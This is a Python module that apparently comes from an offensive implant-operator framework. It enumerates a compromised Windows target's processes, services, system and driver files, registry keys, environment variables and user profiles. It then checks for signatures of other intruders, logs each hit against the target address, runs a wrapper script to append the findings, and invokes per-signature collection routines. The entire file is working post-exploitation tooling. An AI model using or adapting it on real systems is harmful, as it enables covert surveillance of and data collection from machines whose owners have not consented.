
import os
import sys
import dsz.version.checks
import dsz.cmd
import dsz.path.windows
import ops
import datastore
from sigs import FIND_SIG, GET_SIG

def getProcData():
    (cmdStatus, cmdId) = dsz.cmd.RunEx('processes -list -minimal', dsz.RUN_FLAG_RECORD)
    if (not cmdStatus):
        return False
    try:
        pids = dsz.cmd.data.Get('InitialProcessListItem::ProcessItem::Id', dsz.TYPE_INT, cmdId)
        ppids = dsz.cmd.data.Get('InitialProcessListItem::ProcessItem::ParentId', dsz.TYPE_INT, cmdId)
        names = dsz.cmd.data.Get('InitialProcessListItem::ProcessItem::Name', dsz.TYPE_STRING, cmdId)
        paths = dsz.cmd.data.Get('InitialProcessListItem::ProcessItem::Path', dsz.TYPE_STRING, cmdId)
        users = dsz.cmd.data.Get('InitialProcessListItem::ProcessItem::User', dsz.TYPE_STRING, cmdId)
    except RuntimeError:
        pids = None
    if (pids is None):
        return False
    datastore.PROCESS_NAME_SET = set(names)
    datastore.PROCESS_DATA = zip(pids, ppids, names, paths, users)
    return True

def getSvcData():
    (cmdStatus, cmdId) = dsz.cmd.RunEx('services', dsz.RUN_FLAG_RECORD)
    if (not cmdStatus):
        return False
    try:
        svcnames = dsz.cmd.data.Get('service::servicename', dsz.TYPE_STRING, cmdId)
        dispnames = dsz.cmd.data.Get('service::displayname', dsz.TYPE_STRING, cmdId)
        states = dsz.cmd.data.Get('service::state', dsz.TYPE_STRING, cmdId)
        types = dsz.cmd.data.Get('service::servicetype::value', dsz.TYPE_INT, cmdId)
    except RuntimeError:
        svcnames = None
    if (svcnames is None):
        return False
    datastore.SERVICE_NAME_SET = set(svcnames)
    datastore.SERVICE_DATA = zip(svcnames, dispnames, states, types)
    return True

def getFsData():
    (syspath, systemroot) = dsz.path.windows.GetSystemPaths()
    datastore.SYSPATH_STR = syspath
    datastore.SYSTEMROOT_STR = (u'%s\\%s' % (syspath, systemroot))
    datastore.DRIVERPATH_STR = (u'%s\\%s\\%s' % (syspath, systemroot, 'drivers'))
    datastore.ENV_VARS = {}
    (cmdStatus, cmdId) = dsz.cmd.RunEx(('dir -mask * -path %s' % syspath), dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        names = dsz.cmd.data.Get('DirItem::FileItem::name', dsz.TYPE_STRING, cmdId)
        datastore.SYSPATH_FILE_SET = set(names)
    (cmdStatus, cmdId) = dsz.cmd.RunEx(('dir -mask * -path %s' % datastore.SYSTEMROOT_STR), dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        names = dsz.cmd.data.Get('DirItem::FileItem::name', dsz.TYPE_STRING, cmdId)
        datastore.SYSTEMROOT_FILE_SET = set(names)
    (cmdStatus, cmdId) = dsz.cmd.RunEx(('dir -mask * -path %s' % datastore.DRIVERPATH_STR), dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        names = dsz.cmd.data.Get('DirItem::FileItem::name', dsz.TYPE_STRING, cmdId)
        sizes = dsz.cmd.data.Get('DirItem::FileItem::size', dsz.TYPE_INT, cmdId)
        dirflags = dsz.cmd.data.Get('DirItem::FileItem::Attributes::directory', dsz.TYPE_BOOL, cmdId)
        datastore.DRIVERPATH_FILE_SET = set(names)
        datastore.DRIVERPATH_DATA = zip(names, sizes, dirflags)
    (cmdStatus, cmdId) = dsz.cmd.RunEx('registryquery -hive L -key "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList" -value ProfilesDirectory', dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        try:
            [profile_path] = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING, cmdId)
            print ('got profile path: %s' % profile_path)
        except RuntimeError:
            profile_path = None
    else:
        return False
    (suc, cmdid) = dsz.cmd.RunEx('environment -get', dsz.RUN_FLAG_RECORD)
    if suc:
        cmd_vars = dsz.cmd.data.Get('environment::value', dsz.TYPE_OBJECT, cmdId=cmdid)
        for cmd_var in cmd_vars:
            [env_var_name] = dsz.cmd.data.Get(('%s::name' % cmd_var), dsz.TYPE_STRING)
            [env_var_val] = dsz.cmd.data.Get(('%s::value' % cmd_var), dsz.TYPE_STRING)
            datastore.ENV_VARS[env_var_name] = env_var_val
    else:
        return False
    sys_drive = datastore.ENV_VARS.get('SystemDrive')
    datastore.PROGRAM_FILES_STR = datastore.ENV_VARS.get('ProgramFiles', ('%s\\..\\Program Files' % datastore.SYSPATH_STR))
    if dsz.version.checks.IsOs64Bit():
        datastore.PROGRAM_FILESX86_STR = datastore.ENV_VARS.get('ProgramFiles(x86)', ('%s\\..\\Program Files (x86)' % datastore.SYSPATH_STR))
    datastore.PROFILE_PATH = profile_path.replace('%%SystemDrive%%', sys_drive)
    (cmdStatus, cmdId) = dsz.cmd.RunEx(('dir -mask * -path "%s" -dirsonly' % datastore.PROFILE_PATH), dsz.RUN_FLAG_RECORD)
    if cmdStatus:
        user_dirs = dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING, cmdId)
        if ('.' in user_dirs):
            user_dirs.remove('.')
        if ('..' in user_dirs):
            user_dirs.remove('..')
        datastore.USER_DIRS_LIST = user_dirs
    else:
        datastore.USER_DIRS_LIST = list()
    return True

def getRegData():
    (cmdStatus, cmdId) = dsz.cmd.RunEx('registryquery -hive U', dsz.RUN_FLAG_RECORD)
    if (not cmdStatus):
        return False
    try:
        subkeys = dsz.cmd.data.Get('key::subkey::name', dsz.TYPE_STRING, cmdId)
    except:
        subkeys = None
    if (subkeys is None):
        return False
    datastore.HKEY_USERS_DATA = subkeys
    return True

def sigcheck():
    dsz.control.Method()
    dsz.control.echo.Off()
    getProcData()
    getSvcData()
    getFsData()
    getRegData()
    sig_found = False
    other_peeps = os.path.join(ops.LOGDIR, 'other_peeps.txt')
    for x in range(len(FIND_SIG)):
        if (FIND_SIG[x] is None):
            continue
        result = FIND_SIG[x]()
        if result:
            sig_found = True
            try:
                with open(other_peeps, 'a') as fd:
                    fd.write(('SIG%02d FOUND on %s!\n' % ((x + 1), ops.TARGET_ADDR)))
            except IOError as ioe:
                print ('Error Writing File: %s' % ioe.__str__())
            dsz.cmd.RunEx(('script DropboxWrapper.dss AppendFileDefaultName SIG%02d ItsHere' % (x + 1)), 0)
            print ('find_%02d return true' % (x + 1))
            if (GET_SIG[x] is not None):
                print ('calling getter for sig %02d' % (x + 1))
                GET_SIG[x]()
        else:
            print ('find_%02d returned false' % (x + 1))
    if (sig_found and os.path.isfile(other_peeps)):
        dsz.cmd.RunEx(('local run -command "cmd.exe /c notepad.exe %s"' % other_peeps), 0)
    return True
if (__name__ == '__main__'):
    if (not sigcheck()):
        sys.exit(1)